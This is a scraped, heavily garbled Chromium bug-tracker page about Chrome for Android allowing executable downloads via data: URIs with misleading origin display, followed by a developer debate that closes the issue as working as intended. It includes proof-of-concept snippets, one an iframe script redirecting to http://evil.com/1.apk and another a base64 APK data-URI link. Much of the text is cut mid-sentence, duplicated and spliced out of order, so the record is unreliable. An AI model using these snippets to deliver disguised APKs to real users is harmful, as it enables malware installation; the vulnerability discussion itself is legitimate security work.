class="line"><!----> and <!----></span>#1157743<a class="strike-through" target="_blank" href="/p/chromium/issues/detail?id=1157743" title="Security: spoof download on any websites"><!---->#1157743<!----></a>.<span class="line"><!---->.<!----></span><br><br>#1213350: chrome show origin "about:srcdoc" instead of the real origin "<span class="line"><!---->#1213350: chrome show origin "about:srcdoc" instead of the real origin "<!----></span>http://evil.com<a class="undefined" target="_blank" href="http://evil.com"><!---->http://evil.com<!----></a>"<span class="line"><!---->"<!----></span><br>```<span class="line"><!---->```<!----></span><br><iframe srcdoc="<script>document.location='<span class="line"><!---->&lt;iframe srcdoc="&lt;script&gt;document.location='<!----></span>http://evil.com/1.apk<a class="undefined" target="_blank" href="http://evil.com/1.apk"><!---->http://evil.com/1.apk<!----></a>'<span class="line"><!---->'<!----></span></script>"></iframe><span "http:s//ybt01.github.io"<span class="line"><!---->#1305184: chrome show origin "data:..." instead of the real origin "http:s//ybt01.github.io"<!----></span><br>```<span class="line"><!---->```<!----></span><br><a id="a1" href="data:                                                      application/vnd.android.package-archive;base64,UEsDBBQACAgIAJdibEYXK8+ZngQAAHQPAAATAAQAQW5kcm9pZE1hbml>click me</a><span class="line"><!---->&lt;a id="a1" href="data:                                                      application/vnd.android.package-archive;base64,UEsDBBQACAgIAJdibEYXK8+ZngQAAHQPAAATAAQAQW5kcm9pZE1hbml&gt;click me&lt;/a&gt;<!----></span><br>```<span data:application/vnd.android.package-archive, application/gz and the like.<span class="line"><!---->- #1305184 need block navigate top frame to data:application/vnd.android.package-archive, application/gz and the like.<!----></span><br>- Show the real origin "<span class="line"><!---->- Show the real origin "<!----></span>https://ybt01.github.io<a class="undefined" target="_blank" /chrome/browser/download/android/download_manager_service.cc <span class="line"><!----> instead "data:..." in chrome://downloads page, the patch location maybe at           <a class="comment-link" href="?id=1305698#c10">Comment 10<!----></a>

          
        by

        Hi @qinmin and @bookholt,<span class="line"><!---->Hi @qinmin and @bookholt,<!----></span><br><br>My first sugggestion is that chrome shouldn't treat any data URI with executable MIMIE type(application/xxx) as file download requests, victims are likely to think that such a download URI "data:..." is trusted, because it doesn't contain any intuitive domains or IPs.<span class="line"><!---->My first sugggestion is that chrome shouldn't treat any data URI with executable MIMIE type(application/xxx) as file download requests, victims are likely to think that such a download URI "data:..." is trusted, because it doesn't contain any intuitive domains or IPs.<!----></span><br>- application/vnd.android.package-archive (for apk)<span class="line"><!---->- application/vnd.android.package-archive (for apk)<!----></span><br>- application/vnd.microsoft.portable-executable (for exe)<span class="line"><!---->- application/vnd.microsoft.portable-executable (for exe)<!----></span><br>- application/octet-stream (for bin/dmg)<span class="line"><!---->- application/octet-stream (for bin/dmg)<!----></span><br>...<span class="line"><!---->...<!----></span><br><br>And the 2nd sugggestion, chrome for android needs remove the space chars in download origin.<span class="line"><!---->And the 2nd sugggestion, chrome for android needs remove the space chars in download origin.<!----></span><mr-comment-content></mr-comment-content>

        I am wondering whether this should be something safebrowsing should do instead of download. <span class="line"><!---->I am wondering whether this should be something safebrowsing should do instead of download. <!----></span><br>Download already shows a dangerous warning for apk or exe download. As for the url or file content, safebrowsing has deep scans and can check whether the URL is frequently downloaded.<span class="line"><!---->Download already shows a dangerous warning for apk or exe download. As for the url or file content, safebrowsing has deep scans and can check whether the URL is frequently downloaded.<!----></span><br><br>Another rationale is that after downloading a file, not a lot users today actually check the download URL today or go to download page. So blocking the data URI doesn't increase user awareness of the insecure URL, or make it harder for attackers to trick user  to think that he is downloading something safing.<span class="line"><!---->Another rationale is that after downloading a file, not a lot users today actually check the download URL today or go to download page. So blocking the data URI doesn't increase user awareness of the insecure URL, or make it harder for attackers to trick user  to think that he is downloading something safing.<!----></span><mr-comment-content></mr-comment-content>
        
          
        <div>
          
        </div>

        If there is a download happening, safebrowsing is probably already checking it and scanning whenever applicable. I can verify that though.<span class="line"><!---->If there is a download happening, safebrowsing is probably already checking it and scanning whenever applicable. I can verify that though.<!----></span><br><br>I think if data URLs are being blocked for navigation because they can confuse users, data URLs should be blocked from downloading too. We can probably find out if this is a bug or a deliberate choice.<span class="line"><!---->I think if data URLs are being blocked for navigation because they can confuse users, data URLs should be blocked from downloading too. We can probably find out if this is a bug or a deliberate choice.<!----></span><br><br>As for the URI address shown on the chrome://downloads, showing "data:" seems fine to me, as that is the source of the download.<span class="line"><!---->As for the URI address shown on the chrome://downloads, showing "data:" seems fine to me, as that is the source of the download.<!----></span><mr-comment-content></mr-comment-content>

        For <span class="line"><!---->For <!----></span>comment#11<a class="undefined" target="_blank" href="#c11"><!---->comment#11<!----></a>:<span class="line"><!---->:<!----></span><br><br>Download already shows a dangerous warning for apk or exe download.<span class="line"><!---->Download already shows a dangerous warning for apk or exe download.<!----></span><br>-------------------------------<span class="line"><!---->-------------------------------<!----></span><br>Chrome shows a dangerous warning for all apks download even if we download google play apk or download from some popular website like zoom.us. So this warning is meaningless in thie current scenario.<span class="line"><!---->Chrome shows a dangerous warning for all apks download even if we download google play apk or download from some popular website like zoom.us. So this warning is meaningless in thie current scenario.<!----></span><br><br><br>Another rationale is that after downloading a file, not a lot users today actually check the download URL today or go to download page.<span class="line"><!---->Another rationale is that after downloading a file, not a lot users today actually check the download URL today or go to download page.<!----></span><br>-----------------------<span class="line"><!---->-----------------------<!----></span><br>For desktop chrome, I admit users don't always check the download URL or go to download page, but when we download an installable apk file in android, users are very likely to click the file in the download page for installation.<span class="line"><!---->For desktop chrome, I admit users don't always check the download URL or go to download page, but when we download an installable apk file in android, users are very likely to click the file in the download page for installation.<!----></span><mr-comment-content></mr-comment-content>

        apk is an openable file type, so users could open it from notification and from download message, I don't think download page is the main entry point.<span class="line"><!---->apk is an openable file type, so users could open it from notification and from download message, I don't think download page is the main entry point.<!----></span><br><br>From attackers point of view,  using a data URI would not be easier compared to just using a link with URL like <span class="line"><!---->From attackers point of view,  using a data URI would not be easier compared to just using a link with URL like <!----></span>"<span class="line"><!---->"<!----></span>gogle.com<a class="undefined" target="_blank" href="https://gogle.com"><!---->gogle.com<!----></a>", <span class="line"><!---->", <!----></span>"<span class="line"><!---->"<!----></span>g00gle.com<a class="undefined" target="_blank" href="https://g00gle.com"><!---->g00gle.com<!----></a>" to confuse the user, or even using specially encoded "g" or "o" in the URL. So I don't feel blocking data URI will be very helpful here.<span class="line"><!---->" to confuse the user, or even using specially encoded "g" or "o" in the URL. So I don't feel blocking data URI will be very helpful here.<!----></span><mr-comment-content></mr-comment-content>

        Regarding #17, as I said, blocking data URI download doesn't make user safer:<span class="line"><!---->Regarding #17, as I said, blocking data URI download doesn't make user safer:<!----></span><br>1. most users don't go to download home to launch apk.<span class="line"><!---->1. most users don't go to download home to launch apk.<!----></span><br>2. Attacker can host the apk on a URL starting with <span class="line"><!---->2. Attacker can host the apk on a URL starting with <!----></span>"<span class="line"><!---->"<!----></span>googIe.com<a class="undefined" target="_blank" href="https://googIe.com"><!---->googIe.com<!----></a>" that uses capitalized "i" instead of "l". And there is no need to use data URI to trick users.<span class="line"><!---->" that uses capitalized "i" instead of "l". And there is no need to use data URI to trick users.<!----></span><br><br>The dangerous download dialog already presents a warning to users.  And hopefully things like deep scanning or safe browsing can detect malicious apks in the future. So I don't feel like blocking web standards is the right solution.<span class="line"><!---->The dangerous download dialog already presents a warning to users.         by

          <a class="comment-link" href="?id=1305698#c20">Comment 20<!----></a>

          
        by

        Personally I think download scanning or download URL checking are much safer than blocking. Download scanning can prevent the use of similar URL cases above (so it can also handle non-data URL), and protects users who never uses download page or pays attention to download URLs.<span class="line"><!---->Personally I think download scanning or download URL checking are much safer than blocking. Download scanning can prevent the use of similar URL cases above (so it can also handle non-data URL), and protects users who never uses download page or pays attention to download URLs.<!----></span><br> <span class="line"><!----> <!----></span><br>That's why I think this should be done in safe browsing rather than download. Another thing we could do is to warn user about data URL and blob URL in dangerous download dialog that they cannot be trusted, so users don't rely on download homes can know about the security risk<span class="line"><!---->That's why I think this should be done in safe browsing rather than download. Another thing we could do is to warn user about data URL and blob URL in dangerous download dialog that they cannot be trusted, so users don't rely on download homes can know about the security risk<!----></span><mr-comment-content></mr-comment-content>
        
          
        <div>
          
        </div>
      <div class="comment-body">
        <mr-comment-content></mr-comment-content>
        <div>
          
        </div>
      </div>

        There have been a bunch of ideas suggested by the reporter. I will try to summarize them<span class="line"><!---->There have been a bunch of ideas suggested by the reporter. I will try to summarize them<!----></span><br><br>1) Misleading filename in <span class="line"><!---->1) Misleading filename in <!----></span>#c17<a class="undefined" target="_blank" href="#c17"><!---->#c17<!----></a> to confuse the user about the origin of the download. This is something that can be a duplicate for the new downloads UX work, where the filename stands out prominently, and is not a part of a sentence that can be misleading.<span class="line"><!----> to confuse the user about the origin of the download. This is something that can be a duplicate for the new downloads UX work, where the filename stands out prominently, and is not a part of a sentence that can be misleading.<!----></span><br><br>2) Using data: URI for initiating a download. I think this is deliberately allowed, and is not a oversight or a bug, see <span class="line"><!---->2) Using data: URI for initiating a download. I think this is deliberately allowed, and is not a oversight or a bug, see <!----></span>issue 594215<a class="strike-through" target="_blank" href="/p/chromium/issues/detail?id=594215" title="Disable page-initiated main frame navigations to data URLs"><!---->issue 594215<!----></a>. Infact even navigation to data: URI in a new tab is allowed, replicate by visiting <span class="line"><!---->. Infact even navigation to data: URI in a new tab is allowed, replicate by visiting <!----></span>https://bayden.com/test/data.htm<a class="undefined" target="_blank" href="https://bayden.com/test/data.htm"><!---->https://bayden.com/test/data.htm<!----></a>,<span class="line"><!---->,<!----></span> right click and open a data URI page in a new tab.<span class="line"><!----> right click and open a data URI page in a new tab.<!----></span><br>I do not think banning data: URI for downloads, even if just for executables can be considered till there is data backing up about the prevelance of this mechanism, its ability to bypass safe browsing checks, and the impact on the browsing experience if websites cannot use data: URI for downloads.<span class="line"><!---->I do not think banning data: URI for downloads, even if just for executables can be considered till there is data backing up about the prevelance of this mechanism, its ability to bypass safe browsing checks, and the impact on the browsing experience if websites cannot use data: URI for downloads.<!----></span><br><br>3) Not displaying the origin of the website in chrome://downloads. As Min pointed out, we do display the origin of the download, which is the data: URI and is accurate. Changing that adds questionable benefit to security, as the user is likely to open the download without visiting chrome://downloads, and further reporting a URI not of the download, but of the website might just confuse the user.<span class="line"><!---->3) Not displaying the origin of the website in chrome://downloads. As Min pointed out, we do display the origin of the download, which is the data: URI and is accurate. Changing that adds questionable benefit to security, as the user is likely to open the download without visiting chrome://downloads, and further reporting a URI not of the download, but of the website might just confuse the user.<!----></span><br><br>In light of this discussion, I am marking this bug as working as intended.<span class="line"><!---->In light of this discussion, I am marking this bug as working as intended.<!----></span><mr-comment-content></mr-comment-content>

block leads to incorrect security UI in Downloads<span class="line"><!---->Insufficient policy enforcement in data URI block leads to incorrect security UI in Downloads<!----></span><br><br><br>---<span class="line"><!---->---<!----></span><br><br>### Bug location<span class="line"><!---->### Bug location<!----></span><br><br><br>#### Which product or website have you found a vulnerability in?<span class="line"><!---->#### Which product or website have you found a vulnerability in?<!----></span><br><br>Google Chrome<span class="line"><!---->Google Chrome<!----></span><br><br><br>---<span class="line"><!---->---<!----></span><br><br>### The problem<span class="line"><!---->### The problem<!----></span><br><br><br>#### Please describe the technical details of the vulnerability<span class="line"><!---->#### Please describe the technical details of the vulnerability<!----></span><br><br>Hi team,<span class="line"><!---->Hi team,<!----></span><br><br>This is a re-submit of <span class="line"><!---->This is a re-submit of <!----></span>issue #1305184<a class="strike-through" target="_blank" href="/p/chromium/issues/detail?id=1305184" title="Incorrect UI in Downloads via data scheme"><!---->issue #1305184<!----></a>.<span class="line"><!---->.<!----></span><br><br>I will explain in detail what is the difference between #1305184 and #121259 according to the email tips from <span class="line"><!---->I will explain in detail what is the difference between #1305184 and #121259 according to the email tips from <!----></span>security-vrp@chromium.org<a class="undefined" target="_blank" href="mailto:security-vrp@chromium.org"><!---->security-vrp@chromium.org<!----></a>.<span on webpage or host the attached poc.html in your own server.<span class="line"><!----> and click link on webpage or host the attached poc.html in your own server.<!----></span><br><br><br><br>The differences:<span class="line"><!---->The differences:<!----></span><br><br>1)#121259 means an attacker could spoof a file download dialog on any domains like<span class="line"><!---->1)#121259 means href="https://abc.xyz"><!---->https://abc.xyz<!----></a>")<span class="line"><!---->")<!----></span> in my <span class="line"><!----> in my <!----></span>issue #1305184<a class="strike-through" #121259.<span class="line"><!---->'s PoC, the root cause of #1305184 has no relation with #121259.<!----></span><br><br><br>2)The core problem is chrome doesn't allow navigate top frame to data URL under normal scenarios.<span class="line"><!---->2)The core problem is chrome doesn't allow navigate top frame to data URL under normal scenarios.<!----></span><br>For example:<span class="line"><!---->For example:<!----></span><br>```<span class="line"><!---->```<!----></span><br><a href="data:text/html,xxx">click me</a> //this will be blocked<span class="line"><!---->&lt;a href="data:text/html,xxx"&gt;click me&lt;/a&gt; //this will be blocked<!----></span><br>```<span class="line"><!---->```<!----></span><br>But chrome doesn't block the navigation when we set mime type of data URI to "application/vnd.android.package-archive application/gz ...", instead chrome think it is a file download request.<span class="line"><!---->But chrome doesn't block the navigation when we set mime type of data URI to "application/vnd.android.package-archive application/gz ...", instead chrome think it is a file download request.<!----></span><br><br>3)My <span           Comment 10<a class="comment-link" href="?id=1305698#c10">Comment 10<!----></a>

          
        by
        
      <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
      schedule<i id="availability-icon" class="material-icons inline-icon ${user.last_visit_timestamp ? '': 'inline-icon-unseen'}" title="undefined" hidden="">schedule</i>

        <div>
          <a class="comment-link" href="?id=1305698#c10">Comment 10<!----></a>

          
        by
        <mr-user-link></mr-user-link>
        on
        <chops-timestamp title="Tue, Mar 15, 2022, 3:58 AM EDT"></chops-timestamp>
        
      
        </div>
        
      <div role="heading" class="comment-header" aria-level="2">
        <div>
          <a class="comment-link" href="?id=1305698#c10">Comment 10<!----></a>

          
        by
        <mr-user-link></mr-user-link>
        on
        <chops-timestamp title="Tue, Mar 15, 2022, 3:58 AM EDT"></chops-timestamp>
        
      
        </div>
        
      </div>
    
      
        
        
      
        Hi @qinmin and @bookholt,<span class="line"><!---->Hi @qinmin and @bookholt,<!----></span><br><br>My first sugggestion is that chrome shouldn't treat any data URI with executable MIMIE type(application/xxx) as file download requests, victims are likely to think that such a download URI "data:..." is trusted, because it doesn't contain any intuitive domains or IPs.<span class="line"><!---->My first sugggestion is that chrome shouldn't treat any data URI with executable MIMIE type(application/xxx) as file download requests, victims are likely to think that such a download URI "data:..." is trusted, because it doesn't contain any intuitive domains or IPs.<!----></span><br>- application/vnd.android.package-archive (for apk)<span class="line"><!---->- application/vnd.android.package-archive (for apk)<!----></span><br>- application/vnd.microsoft.portable-executable (for exe)<span class="line"><!---->- application/vnd.microsoft.portable-executable (for exe)<!----></span><br>- application/octet-stream (for bin/dmg)<span class="line"><!---->- application/octet-stream (for bin/dmg)<!----></span><br>...<span class="line"><!---->...<!----></span><br><br>And the 2nd sugggestion, chrome for android needs remove the space chars in download origin.<span class="line"><!---->And the 2nd sugggestion, chrome for android needs remove the space chars in download origin.<!----></span><mr-comment-content></mr-comment-content>
        
          
            
      
        
          
          space_chars_show_in_android.png<b><!---->space_chars_show_in_android.png<!----></b>

        I am wondering whether this should be something safebrowsing should do instead of download. <span class="line"><!---->I am wondering whether this should be something safebrowsing should do instead of download. <!----></span><br>Download already shows a dangerous warning for apk or exe download. As for the url or file content, safebrowsing has deep scans and can check whether the URL is frequently downloaded.<span class="line"><!---->Download already shows a dangerous warning for apk or exe download. As for the url or file content, safebrowsing has deep scans and can check whether the URL is frequently downloaded.<!----></span><br><br>Another rationale is that after downloading a file, not a lot users today actually check the download URL today or go to download page. So blocking the data URI doesn't increase user awareness of the insecure URL, or make it harder for attackers to trick user  to think that he is downloading something safing.<span class="line"><!---->Another rationale is that after downloading a file, not a lot users today actually check the download URL today or go to download page. So blocking the data URI doesn't increase user awareness of the insecure URL, or make it harder for attackers to trick user  to think that he is downloading something safing.<!----></span><mr-comment-content></mr-comment-content>
        
          
        <div>
          
        </div>

        If there is a download happening, safebrowsing is probably already checking it and scanning whenever applicable. I can verify that though.<span class="line"><!---->If there is a download happening, safebrowsing is probably already checking it and scanning whenever applicable. I can verify that though.<!----></span><br><br>I think if data URLs are being blocked for navigation because they can confuse users, data URLs should be blocked from downloading too. We can probably find out if this is a bug or a deliberate choice.<span class="line"><!---->I think if data URLs are being blocked for navigation because they can confuse users, data URLs should be blocked from downloading too. We can probably find out if this is a bug or a deliberate choice.<!----></span><br><br>As for the URI address shown on the chrome://downloads, showing "data:" seems fine to me, as that is the source of the download.<span class="line"><!---->As for the URI address shown on the chrome://downloads, showing "data:" seems fine to me, as that is the source of the download.<!----></span><mr-comment-content></mr-comment-content>

        For <span class="line"><!---->For <!----></span>comment#11<a class="undefined" target="_blank" href="#c11"><!---->comment#11<!----></a>:<span class="line"><!---->:<!----></span><br><br>Download already shows a dangerous warning for apk or exe download.<span class="line"><!---->Download already shows a dangerous warning for apk or exe download.<!----></span><br>-------------------------------<span class="line"><!---->-------------------------------<!----></span><br>Chrome shows a dangerous warning for all apks download even if we download google play apk or download from some popular website like zoom.us. So this warning is meaningless in thie current scenario.<span class="line"><!---->Chrome shows a dangerous warning for all apks download even if we download google play apk or download from some popular website like zoom.us. So this warning is meaningless in thie current scenario.<!----></span><br><br><br>Another rationale is that after downloading a file, not a lot users today actually check the download URL today or go to download page.<span class="line"><!---->Another rationale is that after downloading a file, not a lot users today actually check the download URL today or go to download page.<!----></span><br>-----------------------<span class="line"><!---->-----------------------<!----></span><br>For desktop chrome, I admit users don't always check the download URL or go to download page, but when we download an installable apk file in android, users are very likely to click the file in the download page for installation.<span class="line"><!---->For desktop chrome, I admit users don't always check the download URL or go to download page, but when we download an installable apk file in android, users are very likely to click the file in the download page for installation.<!----></span><mr-comment-content></mr-comment-content>

        For <span class="line"><!---->For <!----></span>comment #12<a class="undefined" target="_blank" href="#c12"><!---->comment #12<!----></a>:<span class="line"><!---->:<!----></span><br><br>I think if data URLs are being blocked for navigation because they can confuse users, data URLs should be blocked from downloading too<span class="line"><!---->I think if data URLs are being blocked for navigation because they can confuse users, data URLs should be blocked from downloading too<!----></span><br>--------------------<span class="line"><!---->--------------------<!----></span><br>I couldn't agree more. If a file <span class="line"><!---->I couldn't agree more. If a file <!----></span>"<span class="line"><!---->"<!----></span>twitter.com/botnet_c2/chrome.apk<a class="undefined" target="_blank" href="https://twitter.com/botnet_c2/chrome.apk"><!---->twitter.com/botnet_c2/chrome.apk<!----></a>"<span class="line"><!---->"<!----></span> is judged to be a malicious file by Google safe browsing or VirusTotal, users will be blocked to download from this URL, the creator of botnet could use the data URI to trigger download.<span class="line"><!----> is judged to be a malicious file by Google safe browsing or VirusTotal, users will be blocked to download from this URL, the creator of botnet could use the data URI to trigger download.<!----></span><br><br>So it's a good idea that data URLs with executable MIMIE type(application/xxx) be blocked from downloading, other types of files are probably okay, users cannot execute them directly.<span class="line"><!---->So it's a good idea that data URLs with executable MIMIE type(application/xxx) be blocked from downloading, other types of files are probably okay, users cannot execute them directly.<!----></span><mr-comment-content></mr-comment-content>

          <a class="comment-link" href="?id=1305698#c15">Comment 15<!----></a>

          
        by

        apk is an openable file type, so users could open it from notification and from download message, I don't think download page is the main entry point.<span class="line"><!---->apk is an openable file type, so users could open it from notification and from download message, I don't think download page is the main entry point.<!----></span><br><br>From attackers point of view,  using a data URI would not be easier compared to just using a link with URL like <span class="line"><!---->From attackers point of view,  using a data URI would not be easier compared to just using a link with URL like <!----></span>"<span class="line"><!---->"<!----></span>gogle.com<a class="undefined" target="_blank" href="https://gogle.com"><!---->gogle.com<!----></a>", <span class="line"><!---->", <!----></span>"<span class="line"><!---->"<!----></span>g00gle.com<a class="undefined" target="_blank" href="https://g00gle.com"><!---->g00gle.com<!----></a>" to confuse the user, or even using specially encoded "g" or "o" in the URL. So I don't feel blocking data URI will be very helpful here.<span class="line"><!---->" to confuse the user, or even using specially encoded "g" or "o" in the URL.         Regarding #17, as I said, blocking data URI download doesn't make user safer:<span class="line"><!---->Regarding #17, as I said, blocking data URI download doesn't make user safer:<!----></span><br>1. most users don't go to download home to launch apk.<span class="line"><!---->1. most users don't go to download home to launch apk.<!----></span><br>2. Attacker can host the apk on a URL starting with <span class="line"><!---->2. Attacker can host the apk on a URL starting with <!----></span>"<span class="line"><!---->"<!----></span>googIe.com<a class="undefined" target="_blank" href="https://googIe.com"><!---->googIe.com<!----></a>" that uses capitalized "i" instead of "l". And there is no need to use data URI to trick users.<span class="line"><!---->" that uses capitalized "i" instead of "l". And there is no need to use data URI to trick users.<!----></span><br><br>The dangerous download dialog already presents a warning to users.  And hopefully things like deep scanning or safe browsing can detect malicious apks in the future. So I don't feel like blocking web standards is the right solution.<span class="line"><!---->The dangerous download dialog already presents a warning to users.  And hopefully things like deep scanning or safe browsing can detect malicious apks in the future. So I don't feel like blocking web standards is the right solution.<!----></span><mr-comment-content></mr-comment-content>

        Personally I think download scanning or download URL checking are much safer than blocking. Download scanning can prevent the use of similar URL cases above (so it can also handle non-data URL), and protects users who never uses download page or pays attention to download URLs.<span class="line"><!---->Personally I think download scanning or download URL checking are much safer than blocking. Download scanning can prevent the use of similar URL cases above (so it can also handle non-data URL), and protects users who never uses download page or pays attention to download URLs.<!----></span><br> <span class="line"><!----> <!----></span><br>That's why I think this should be done in safe browsing rather than download. Another thing we could do is to warn user about data URL and blob URL in dangerous download dialog that they cannot be trusted, so users don't rely on download homes can know about the security risk<span class="line"><!---->That's why I think this should be done in safe browsing rather than download.         by
